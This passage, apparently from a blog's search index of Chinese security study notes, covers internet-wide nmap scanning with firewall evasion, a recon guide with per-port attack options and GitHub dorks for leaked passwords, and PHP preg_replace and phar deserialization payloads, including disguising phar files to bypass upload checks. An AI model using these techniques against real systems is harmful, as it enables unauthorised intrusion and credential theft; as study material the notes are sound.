tcp-allports-1M-IPs; rm tp 随机生成1200000个IP地址（-iR 120000），并进行列表扫描（-sL，列举出IP地址，不进行真正的扫描），不进行dns解析操作（-n），这样将产生Nmap列表扫描的结果。在此 结果中搜出未扫描的行（grep “not scanned”），打印出每一行的第二列内容（awk ‘{print $2}’，也就是IP地址），然后对获取到的IP地址进行排序（sort -n），然后剔除重复IP地址，将结果保存到临时文件tp，再取出前1000000个IP地址保存到tcp-allports-1M-IPs文件中，删除 临时文件。 1nmap -sP -PE -PP -PS21,22,23,25,80,113,31339-PA80,113,443,10042 –source-port 53 -T4 -iL tcp-allports-1M-IPs 使用产生的IP地址（-iL tcp-allports-1M-IPs），指定发送包的源端口为53（–source-port 53，该端口是DNS查询端口，一般的防火墙都允许来自此端口的数据包），时序级别为4（-T4，探测速度比较快），以TCP SYN包方式探测目标机的21,22,23,25,80,113,31339端口，以TCP ACK包方式探测对方80,113,443,10042端口，另外也发送ICMP ECHO/ICMP TIMESTAMP包探测对方主机。只要上述的探测包中得到一个回复，就可以证明目标主机在线。 1nmap -S [srcip] -d –max-scan-delay 10 -oAlogs/tcp-allports-%T-%D -iL tcp-allports-1M-IPs –max-retries 1–randomize-hosts -p- -PS21,22,23,25,53,80,443 -T4 –min-hostgroup 256 –min-rate175 –max-rate 300 使用包含100万个IP地址的文件（-iL tcp-allports-1M-IPs），源端IP地址设置为srcip(指定一个IP地址，保证该IP地址位于统一局域网中，否则无法收到目标机的回 复包)，主机发现过程使用TCP SYN包探测目标机的21,22,23,25,53,80,443，扫描过程将随机打乱主机顺序（–randomize-hosts，因为文件中的IP 已经排序，这里将之打乱，避免被防火墙检查出），端口扫描过程检查全部的TCP端口（-p-，端口1到65535），使用时序级别为4（-T4，速度比较 快），将结果以XML/grepable/普通格式输出到文件中（-oA logs/tcp-allports-%T-%D，其中%T表示扫描时间，%D表示扫描日期）。 -d表示打印调试出信息。 –max-scan-delay 10表示发包最多延时10秒，防止特殊情景下等待过长的时间。 –max-retries 1，表示端口扫描探测包最多被重传一次，防止Nmap在没有收到回复的情况下多次重传探测包，当然这样也会降低探测的准确性。 –min-host-group 256表示进行端口扫描与版本侦测时，同时进行探测的主机的数量，这里至少256个主机一组来进行扫描，可以加快扫描速度。 –min-rate 175和–max-rate 300，表示发包速率介于175和300之间，保证扫描速度不会太慢，也不会因为速率过高引起目标机的警觉。 由以上扫描得出互联网上最可能开放的 10 个 TCP 端口： 1234567891080 (http)23 (telnet)22 (ssh)443 (https)3389 (ms-term-serv)445 (microsoft-ds)139 (netbios-ssn)21 (ftp)135 (msrpc)25 (smtp) 最可能开放的 UDP 端口： 12345678910137 (netbios-ns)161 (snmp)1434 (ms-sql-m)123 (ntp)138 (netbios-dgm)445 (microsoft-ds)135 (msrpc)67 (dhcps)139 (netbios-ssn)53 (domain) 扫描 Web 站点1nmap -sV -p 80 -T4 –script=http*,default scanme.nmap.org","link":"/2020/06/12/nmap/"},{"title":"计算机网络","text":"《计算机网络：自顶向下方法》学习笔记、Wireshark 实验 计算机网络和因特网什么是因特网 描述因特网的具体构成，即构成因特网的基本硬件和软件组件 根据为分布式应用提供服务的联网基础设置描述因特网 具体构成描述因特网中存在大量主机，或称为端系统。它们通过通信链路和分组交换机连接到一起。当一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节，由此形成的信息包称为分组。这些分组通过网络发送到目的端系统，在那里被装配成初始数据。 分组交换机从一条入通信链路接受到达的分组，并从一条出通信链路转发该分组，分组交换机中最常见的两种是路由器（router）和链路层交换机（link-layer switch）。链路层交换机通常用于接入网中，而陆幽清通常用于网络核心中。从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机称为通过该网络的路径（route 或 path）。 端系统通过因特网服务提供商（Internet Service Provider，ISP）接入因特网。每个ISP是由一个或多个分组交换机和多段通信链路组成的网络，为端系统提供了不同类型的网络接入。每个 ISP 都是独立管理的，运行 IP 协议，遵从一定的命名和地址习惯。 端系统、分组交换机和其他因特网部件都要运行一系列协议（protocol），这些协议控制因特网中的信息的接受和发送。 服务描述从为应用程序提供服务的基础设施的角度描述因特网。分布式应用程序涉及多台相互交换数据的端系统，运行在端系统上而不是网络核心中的分组交换机中。 与因特网相连的端系统提供了一个应用程序编程接口（Application Programming Interface，API）该 API 规定了运行在一个端系统上的软件请求因特网基础设施向运行在另一个端系统上的特定目的地软件交付数据的方式。 什么是协议一个协议定义了在两个或多个通信实体之间交换的报文格式和次序，以及保温发送和/或接受一条报文或其他时间所采取的动作。 网络边缘通常把与因特网项链的计算机和其他设备称为端系统，因为它们位于因特网的边缘。端系统也称为主机，因为它们容纳（host）应用程序。主机有时又分为两类：客户（client）和服务器（server）。 接入网接入网（access network）是指将端系统连接到其边缘路由器（edge router）的物理链路。边缘路由器是端系统到任何其他远程端系统路径上的第一台路由器。接入链路有许多种： DSL、电缆、FTTH、拨号和卫星，用于家庭接入 以太网和 WiFi，用于企业和家挺接入 3G 和 LTE，广域无线接入 物理媒体使用以上接入技术时，也需要使用对应的物理媒体。 双绞铜线 同轴电缆 光纤 陆地无线电信道 卫星无线电信道 网络核心网络核心，即由互联网端系统的分组交换机和链路构成的网状网络。 通过网络链路和交换机移动数据有两种基本方法：电路交换（circuit swiching）和分组交换（packet switching）。 分组交换各种网络应用中，端系统彼此交换报文（message），报文能够包含协议设计者需要的任何东西。报文可以执行一种控制功能，也可以包含数据。为了从源端系统向目的端系统发送一个报文，源将长报文划分为较小的数据块，称之为分组（packet）。在源和目的之间，每个分组都通过铜线链路和分组交换机（packet switch）传送。 存储转发传输多数分组交换机在链路的输入端使用存储转发传输（store-and-forward transmission）机制。存储转发机制是指在交换机能够开始向输出端传输该分组的第一个比特之前，必须接收到整个分组。 排队时延和分组丢失每个分组交换机有多条链路与之相连。对于每条相连的链路，该分组交换机有一个输出缓存（output buffer），也称为输出队列（output queue），它用于存储路由器准备发往那条链路的分组。该输出缓存在分组交换中骑着重要作用。如果到达的分组需要传输到某条链路，但是该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待。因此，除了存储转发时延以外，分组还要承受输出缓存的排队时延（queue delay）。这些时延时是变化的，取决于网络中的拥塞程度。因为缓存大小是有限的，一个到达的分组可能发现该缓存已经被其他等待传输的分组填满，这时将出现分组丢失（丢包，packet lost），到达的分组或已经排队的分组之一将被丢弃。 转发表和路由选择协议因特网中，每个端系统具有一个称为 IP 地址的地址，当源主机要向目的端系统发送一个分组时，源在该分组的首部包含了目的地的 IP 地址，该地址具有一种等级结构。当一个分组到达网络中的路由器时，路由器检查该分组的目的地址的一部分，并向一台相邻路由器转发该分组。每台路由器具有一个转发表（forwarding table）用于将目的地址（或它的一部分）映射为输出链路。当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的输出链路，路由器则将分组导向该输出链路。 因特网具有一些特殊的路由选择协议（routing protocol）用于自动设置转发表。 电路交换在电路交换网络中，在端系统通信会话期间，预留了端系统间通信沿路径所需要的资源（缓存，链路传输速率）。在分组交换网络中，这些资源不是预留的，会话的报文按需使用这些资源，后果可能是不得不等待接入通信链路。 网络的网络提供网络接入的 ISP 本身也需要接入网络，使网络形成了复杂的结构。 分组交换网中的时延、丢包和吞吐量协议层次机器服务模型分层的体系结构协议分层各层的所有协议被称为协议栈（protocol stack），因特网的协议栈由5个层次组成：物理层，链路层，网络层，运输层，和应用层。 应用层是网络应用程序及它们的应用层协议存留的地方，包含许多协议，例如 HTTP，SMTP 和 FTP。位于应用层的信息分组称为报文（message） 运输层是在应用程序端点之间传送应用层报文。因特网中有两个运输层协议，TCP 和 UDP，利用其中任何一个都能运输应用层报文。位于运输层的信息分组称为报文段（segment） 网络层负责将称为数据报（datagram）的网络层分组从一台主机移动到另一台主机。包括 IP 协议和一些路由选择协议。 为了将分组从一个节点（主机或路由器）移动到路径的下一个节点，网络层必须依靠链路层服务。在每个节点，网络层将数据报下传给链路层，链路层沿着路径将数据报传递给下一个节点。在下一个节点，链路层将数据上传给网络层。包括以太网，WiFi 和电缆接入网的 DOCSIS 协议。链路层分组称为帧（frame） 物理层的任务是将帧中的一个一个比特从一个节点移动到下一个节点。该层协议也与链路相关，并且进一步与实际传输媒体相关。比如关于双绞铜线或者同轴电缆的协议。 OSI模型因特网协议栈并不是唯一的协议栈，国际标准化组织（OSI）提出计算机网络应组织为大约 7 层，应用层，表示层，会话层，运输层，网络层，数据链路层和物理层。 封装在每一层，一个分组具有两种类型的字段：首部字段和有效载荷字段（payload field），有效载荷通常来自于上一层的分组。 面对攻击的网络 将有害程序植入计算机 攻击服务器和网络基础设置 嗅探分组 伪装 计算机网络和因特网的历史应用层应用层协议原理网络应用程序体系结构","link":"/2020/08/04/network/"},{"title":"Node.js 相关","text":"不会 Node.js 的人已经不配再做 Web 狗了 NodeNode.js 是运行在服务端的 Javascript。使用 PHP 时，Apache 或者 Nginx 作为 HTTP 服务器，并使用 mode_php5 和 php-cgi 模块，接受 HTTP 请求并提供 Web 页面的过程不需要 PHP 处理。而使用 Node.js 时，我们不仅是在实现一个应用，同时也实现了整个 HTTP 服务器。 Node.js 应用由以下几部分组成： 引入 required 模块：通过 require载入模块 创建服务器：服务器可以监听客户端的请求，类似于 Apache 等 HTTP 服务器 接受请求与响应请求：客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。 创建 Node.js 应用引入 required 模块1var http = require(&quot;http&quot;); 创建服务器使用 http.createServer 方法创建服务器，使用 listen 方法指定 8888 端口，函数通过 request, response 接受和响应数据。 123456789101112131415var http = require('http');http.createServer(function (request, response) { // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // 发送响应数据 &quot;Hello World&quot; response.end('Hello World\\n');}).listen(8888);// 终端打印如下信息console.log('Server running at http://127.0.0.1:8888/'); 使用 node 命令执行： 1node server.js NPMNPM 是随 Node 安装的包管理工具 123npm install &lt;package&gt; # 班底安装包npm install &lt;package&gt; -g # 全局安装包npm uninstall &lt;package&gt; # 卸载包 Node.js REPL（交互式解释器）使用 node 进入REPL 回调函数Node.js 具有异步特性，通过回调函数来实现 事件循环","link":"/2020/08/21/node-js/"},{"title":"渗透框架","text":"一、信息收集whois 信息 获取注册人信息，包括注册邮箱、注册公司、管理员邮箱、管理员联系电话，可以社工，还可以查询同一注册人注册的其他域名，域名对应的NS记录、MX记录，自动识别国内常见托管商 123456http://ipwhois.cnnic.net.cn/http://whois.chinaz.comhttps://x.threatbook.cn/https://who.is/https://whois.aizhan.com/Linux whois 命令 站长之家和微步支持反查，另外两个中文显示有乱码 子域名 爆破， 12345wydomain,sublist3rlayer 子域名挖掘机（支持端口扫描和探测服务器类型）https://phpinfo.me/domainsubDomainsBrute google hack，搜索 site:example.com，也可以使用其他搜索引擎 dns解析记录、爬虫、ssl证书、dns历史解析等等 备案信息分为 IPC 备案信息和公安部备案信息，只有国内服务器需要备案。 12http://www.beianbeian.com/http://www.gsxt.gov.cn/index.html 企业信息天眼查、启信宝 CDN判断 Nslookup，Windows 命令： 1nslookup baidu.com host,dig , Linux 命令： 12host 360.cndig 360.cn 多地ping，网站： 123https://asm.ca.com/en/ping.php/http://ping.chinaz.com/https://ping.aizhan.com/ 使用工具查询 1234http://www.cdnplanet.com/tools/cdnfinder/https://www.ipip.net/ip.htmlhttp://tool.chinaz.com/dns/https://tool.lu/dns/ 绕过 子域名入手，有些子域名没有使用 cdn 利用网站漏洞，比如 phpinfo 信息泄露， Apache status 和 Jboss statu 泄露，源代码泄露， svn信息泄露， github 信息泄露 历史dns记录，查询网站： 12345678https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://sitereport.netcraft.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html CDN 本身入手，比如利用社工获得控制面板的账号密码 Mx记录或邮件，很多站点有发送邮件的功能，比如 rss 订阅，邮件系统一般在内部，没有经过CDN，邮件源码中可能包含服务器真实 IP 国外请求，国内CDN有时不会覆盖国外，可以通过国外代理访问得到真实 IP 1https://asm.ca.com/en/ping.php 扫描探测，通过信息收集，缩小扫描范围，确定一个较小的 IP 和端口范围，通过 http 指纹特征和 keyword 等综合判断 12https://github.com/zmap/zgrab/http://www.ipdeny.com/ipblocks/ Zmap，参考 安全客 - 简单获取 CDN 背后的真实IP 网络空间引擎搜索，zoomeye fofa shodan，获得历史快照，获取特征，例如：特有的 HTTP 头（server类型，版本，cookie等信息）、特定keyword（title, css, js, url等）、特定IP段搜索（fofa支持C段搜索） 查询 HTTPS 证书， 1https://censys.io/ 这个网站会将所有 IP 进行扫描和连接，以及证书探测，如果目标站点有 https 证书，而且默认虚拟主机配了https证书，就可以找所有目标站点是改https证书的站点。 1443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com F5 LTM 负载均衡解码获取真实内网IP，透过F5获取服务器真实内网IP - ThreatHunter 旁站查询与目标网站在同一台服务器上的网站 1https://tool.lu/dns/ C段查询与目标服务器IP在同一C段的服务器 12北极熊扫描器Nmap /24 邮箱收集首先确定目标邮件服务器所在的真实位置，看看邮件服务器有没有什么错误配置，比如没有禁用VREY或者EXPN命令导致用户信息泄露。然后从 whois 中获得域名的注册人，管理员邮箱，利用该搜索引擎和社工库等查看有没有泄露密码。或者从目标站点上搜集邮箱，比如网站上的联系我们，可以用于钓鱼。工具：theharvester 端口扫描开始时可以使用 telnet 简单检查端口是否开放，防止使用扫描器被封IP。可以用 nmap, masscan进行扫描，常见端口以及渗透方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051端口号 端口服务/协议简要说明 关于端口可能的一些渗透用途tcp 20,21 ftp 默认的数据和命令传输端口[可明文亦可加密传输] 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)tcp 22 ssh[数据ssl加密传输] 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…tcp 23 telnet[明文传输] 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获tcp 25 smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务] 邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑tcp/udp 53 dns[域名解析] 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控tcp/udp 69 tftp[简单文件传输协议,无认证] 尝试下载目标及其的各类重要配置文件tcp 80-89,443,8440-8450,8080-8089 web[各种常用的web服务端口] 各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……tcp 110 [邮局协议,可明文可密文] 可尝试爆破,嗅探tcp 137,139,445 samba[smb实现windows和linux间文件共享,明文] 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……tcp 143 imap[可明文可密文] 可尝试爆破udp 161 snmp[明文] 爆破默认团队字符串,搜集目标内网信息tcp 389 ldap[轻量级目录访问协议] ldap注入,允许匿名访问,弱口令tcp 512,513,514 linux rexec 可爆破,rlogin登陆tcp 873 rsync备份服务 匿名访问,文件上传tcp 1194 openvpn 想办法钓vpn账号,进内网tcp 1352 Lotus domino邮件服务 弱口令,信息泄漏,爆破tcp 1433 mssql数据库 注入,提权,sa弱口令,爆破tcp 1521 oracle数据库 tns爆破,注入,弹shell…tcp 1500 ispmanager 主机控制面板 弱口令tcp 1025,111,2049 nfs 权限配置不当tcp 1723 pptp 爆破,想办法钓vpn账号,进内网tcp 2082,2083 cpanel主机管理面板登录 弱口令tcp 2181 zookeeper 未授权访问tcp 2601,2604 zebra路由 默认密码zerbratcp 3128 squid代理服务 弱口令tcp 3312,3311 kangle主机管理登录 弱口令tcp 3306 mysql数据库 注入,提权,爆破tcp 3389 windows rdp远程桌面 shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]tcp 4848 glassfish控制台 弱口令tcp 4899 radmin远程桌面管理工具,现在已经非常非常少了 抓密码拓展机器tcp 5000 sybase/DB2数据库 爆破,注入tcp 5432 postgresql数据库 爆破,注入,弱口令tcp 5632 pcanywhere远程桌面管理工具 抓密码,代码执行,已经快退出历史舞台了tcp 5900,5901,5902 vnc远程桌面管理工具 弱口令爆破,如果信息搜集不到位,成功几率很小tcp 5984 CouchDB 未授权导致的任意指令执行tcp 6379 redis未授权 可尝试未授权访问,弱口令爆破tcp 7001,7002 weblogic控制台 java反序列化,弱口令tcp 7778 kloxo 主机面板登录tcp 8000 Ajenti主机控制面板 弱口令tcp 8443 plesk主机控制面板 弱口令tcp 8069 zabbix 远程执行,sql注入tcp 8080-8089 Jenkins,jboss 反序列化,控制台弱口令tcp 9080-9081,9090 websphere控制台 java反序列化/弱口令tcp 9200,9300 elasticsearch 远程执行tcp 10000 webmin linux主机web控制面板入口 弱口令tcp 11211 memcached 未授权访问tcp 27017,27018 mongodb 爆破,未授权访问tcp 3690 svn服务 svn泄露,未授权访问tcp 50000 SAP Management Console 远程执行tcp 50070,50030 hadoop 默认端口未授权访问 nmap 常用选项： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# 扫描选项-sP # 只扫描在线情况-sS # SYN 扫描-sT # TCP 扫描-sU # UDP 扫描-sV # 服务版本检测-O # 操作系统识别--scanflags # 指定 TCP 标志位，包括 URG, ACK, PSH, RST, SYN, FIN# 时序选项-T0 偏执的：非常非常慢，用于IDS逃逸-T1 猥琐的：相当慢，用于IDS逃逸-T2 有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍-T3 普通的：默认，根据目标的反应自动调整时间模式-T4 野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标-T5 疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口# 脚本-sC 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别 –script=&lt;Lua scripts&gt; &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述–script-args=&lt;n1=v1,[n2=v2,...]&gt; 为脚本提供默认参数–script-args-file=filename 使用文件来为脚本提供参数–script-trace 显示脚本执行过程中发送与接收的数据–script-updatedb 更新脚本数据库–script-help=&lt;scripts&gt; 显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别# 脚本分类auth 负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute 提供暴力破解方式，针对常见的应用如http/snmp等default 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery 对网络进行更多的信息，如SMB枚举、SNMP查询等dos 用于进行拒绝服务攻击exploit 利用已知的漏洞入侵系统external 利用第三方的数据库或资源，例如进行whois解析fuzzer 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware 探测目标机是否感染了病毒、开启了后门等信息safe 此类与intrusive相反，属于安全性脚本version 负责增强服务与版本扫描（Version Detection）功能的脚本vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067按脚本分类扫描# 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令nmap --script=auth 192.168.137.*# 提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解nmap --script=brute 192.168.137.*# 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*# 检查是否存在常见漏洞nmap --script=vuln 192.168.137.* # 在局域网内探查更多服务开启状况nmap -n -p445 --script=broadcast 192.168.137.4# 利用第三方的数据库或资源，例如进行whois解析nmap --script external 202.103.243.110 服务器和中间件信息通过 nmap, zmap 等端口和指纹识别功能搜集，也可以使用 nc 和 telnet 进行 banner信息识别，常用工具 whatweb, www.yunsee.cn , wappalyzer WAFWAF识别一般基于 header 信息，工具：waf00f，whatwaf，nmap nmap 脚本：http-waf-detect, http-waf-fingerprint 敏感文件、目录扫描 御剑，dirsearch，dirb，dirbuster 搜索引擎，基本语法 123456789101112&quot;&quot; # 强制搜索- # 不包含该管检测| # 或者site # 与这个域名相关intext # 正文中包含关键词intitle # 标题中包含关键词cache # 搜索缓存define # 搜索定义filetype # 搜索指定文件类型info # 查找站点基本信息inurl # 包含关键词的URLlink # 包含链接 BBscan GSIL，搜索Github信息 社交平台（QQ群，文库，求职网），可以通过QQ群文件，在线文档平台等泄露敏感信息 CMS12345678国内：http://whatweb.bugscaner.com/look/http://yunsee.cnhttp://finger.tidesec.net/国外：https://whatcms.orghttps://itrack.ru/whatcms/http://cmsdetect.com/ 识别后可以搜索已知漏洞，查找源代码进行审计。 脆弱系统通过网络空间搜索引擎进行查询 123shodanfofazoomeye Github搜索 github 上的信息 邮件配置： 1234567site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp 数据库信息： 123site:Github.com sa passwordsite:Github.com root passwordsite:Github.com User ID=’sa’;Password SVN 信息： 1234site:Github.com svnsite:Github.com svn usernamesite:Github.com svn passwordsite:Github.com svn username password 数据库备份： 1site:Github.com inurl:sql 其他： 1234site:Github.com passwordsite:Github.com ftp ftppasswordsite:Github.com 密码site:Github.com 内部","link":"/2020/04/20/pentest/"},{"title":"PHP 漏洞","text":"PHP 漏洞总结 preg_replace 的代码执行preg_replace 函数在第一个参数包含 /e修饰符时存在代码执行问题，会将第二个参数当作 php 代码执行。 123456function complex($regex, $value) { return preg_replace('/('.$regex.')/ei', 'strtolower(&quot;\\\\1&quot;)', $value)}function ($_GET as $regex =&gt; $value) { echo complex($regex, $value).&quot;\\n&quot;;} 命令执行时，相当于ecal('strtolower(&quot;\\\\1&quot;);')，\\\\1就是\\1，\\1在正则表达式中有自己的含义，指的是第一个子匹配项。 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 payload: /?.*={${phpinfo()}}，对应 preg_replace('/(.*)/ei', 'strtolower(&quot;\\\\1&quot;)', {${phpinfo()}}); 直接写这个 preg_replace 语句可以执行 phpinfo，但是通过 get 传参时，.会被转换成_，php 会将一些非法的 get 数组参数名转化成下划线，非法字符为首字符时，只有.会被替换成下划线，在其他位置时，ascii码为 32, 43, 46, 91, 95 的也会被替换成下划线。 可以换一个 payload: \\$*=${phpinfo()} 需要匹配到{${phpinfo()}}或者${phpinfo()}才能执行phpinfo函数。因为php存在可变变量，当phpinfo执行之后会返回 true，相当于${1}。 1234567var_dump(phpinfo()); // 结果：布尔 truevar_dump(strtolower(phpinfo()));// 结果：字符串 '1'var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));// 结果：字符串'11'var_dump(preg_replace('/(.*)/ie','strtolower(&quot;\\\\1&quot;)','{${phpinfo()}}'));// 结果：空字符串''var_dump(preg_replace('/(.*)/ie','strtolower(&quot;{${phpinfo()}}&quot;)','{${phpinfo()}}'));// 结果：空字符串''这里的'strtolower(&quot;{${phpinfo()}}&quot;)'执行后相当于 strtolower(&quot;{${1}}&quot;) 又相当于 strtolower(&quot;{null}&quot;) 又相当于 '' 空字符串 phar 反序列化phar文件结构 stub 格式为 .*&lt;?php.*__HALT_COMPILER\\(\\);?&gt;，即以__HALT_COMPILER()?&gt;结尾的可以被识别为phar文件。 manifest phar文件本质上是一种压缩文件，每个被压缩文件的权限、属性信息存放在这部分，同时用户自定义的meta-data也会以序列化方式存储在这里（核心内容） size(bytes) description 4 Length of manifest in bytes(1 MB limit) 4 Number of files in th Phar 2 API version of the Phar manifest (currently 1.0.0) 4 Global Phar bitmapped flags 4 Length of Phar alias ? Phar alias (length based on previous) 4 Length of Phar metadata (0 for none) ? Serialized Phar Meta-data, stored in serialize() format at least 24*number of entries bytes entries for each file contents 文件内容 signature(optional) 签名，可以添加来验证文件。 demo根据以上信息构建一个phar文件，php内置phar类处理相关操作 要将php.ini中的phar.readonly设置为Off，否则无法生存phar文件。 Ubuntu 中的位置 /usr/local/php/etc/php.ini phar_gen.php: 1234567891011121314&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 生成的phar的meta-data部分是以序列化方式存储的。 php的许多文件系统函数在通过 phar://协议解析phar文件时会将meta-data反序列化 受影响的函数 fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen fileinode filemtime fileowner fileperms is_dir is_executable is_file is_link is_readable is_writable is_writeable parse_in_file copy unlink stat readfile demo 1234567891011&lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?&gt; 当文件系统函数参数可控时，可以再不调用unserialize()的情况下反序列化。 测试phar_test1.php 12345678910&lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?&gt; 运行一下，得到Destruct called。 再试一下file_exist()，phar_test2.php 1234567891011&lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?&gt; 也可以得到Destruct called 将phar伪造成其他格式文件php识别phar是通过文件头的stub，对其他内容没有要求，因此可以通过添加任意文件头和修改后缀名的方式将phar文件伪造成其他格式的文件。 1234567891011121314&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头 $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以用于绕过上传检测。 利用条件 phar文件能够上传到服务器 有可用的魔术方法作为跳板 文件操作函数参数可控，且 : / phar等没有被过滤 防御 文件系统函数参数可控时，严格检查参数 检查上传文件内容，而不是只检查文件头 可能的话禁用可执行系统命令、代码的危险函数 MD50e00275209979","link":"/2020/05/10/php-vuln/"},{"title":"Pickle 相关","text":"总结一些Pickle安全相关的东西。 背景1Warning: the pickle module is not intended to be secure angainst erroneous or malicuously constructed data. Never unpickle data received from an untrusted or unauthenticated souorce. 在不同的进程或机器中，函数A向函数B传递一个对象有几种方式：选择一个自定义的协议，实现一个公开的协议或者依赖于自身的框架生成字节流。显然最后一种方式是最简单的，也就是序列化和反序列化。 关键函数：dumps()和loads()。 默认序列化过程： 获取类的实例 从这个对象提取它的所有属性__dict__ 把一系列属性转化为键值对 写入类名 写入键值对 反序列化过程： 获取 pickle 流 重建属性列表 利用存储的类名创建对象 把属性复制进新创建的对象 Pickle 依赖于一个微型的虚拟机，pickle 流实际上就是一个程序，其中指令和数据是交错的。 Pickle virtual machine(PVM) 需要的资源：处理器、栈和存储。 处理器：从0字节处开始读取操作码和参数，处理它们，改变栈和内存，重复以上步骤直到pickle流结束。返回栈顶，作为反序列化的对昂。 存储：基本上是寄存器，实现为Python dict，为PVM提供存储。 栈：临时存储数据、参数和对象，实现为 Python list， PVM指令：操作码占1字节，参数用新行标识（有些指令不接受参数，有些接受多个参数）。 指令集： 1234567891011121314151617181920212223242526272829303132333435363738394041424344MARK = b'(' # push special markobject on stackSTOP = b'.' # every pickle ends with STOPPOP = b'0' # discard topmost stack itemPOP_MARK = b'1' # discard stack top through topmost markobjectDUP = b'2' # duplicate top stack itemFLOAT = b'F' # push float object; decimal string argumentINT = b'I' # push integer or bool; decimal string argumentBININT = b'J' # push four-byte signed intBININT1 = b'K' # push 1-byte unsigned intLONG = b'L' # push long; decimal string argumentBININT2 = b'M' # push 2-byte unsigned intNONE = b'N' # push NonePERSID = b'P' # push persistent object; id is taken from string argBINPERSID = b'Q' # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b'R' # apply callable to argtuple, both on stackSTRING = b'S' # push string; NL-terminated string argumentBINSTRING = b'T' # push string; counted binary string argumentSHORT_BINSTRING= b'U' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argumentBINUNICODE = b'X' # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b'a' # append stack top to list below itBUILD = b'b' # call __setstate__ or __dict__.update()GLOBAL = b'c' # push self.find_class(modname, name); 2 string argsDICT = b'd' # build a dict from stack itemsEMPTY_DICT = b'}' # push empty dictAPPENDS = b'e' # extend list on stack by topmost stack sliceGET = b'g' # push item from memo on stack; index is string argBINGET = b'h' # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b'i' # build &amp; push class instanceLONG_BINGET = b'j' # push item from memo on stack; index is 4-byte argLIST = b'l' # build list from topmost stack itemsEMPTY_LIST = 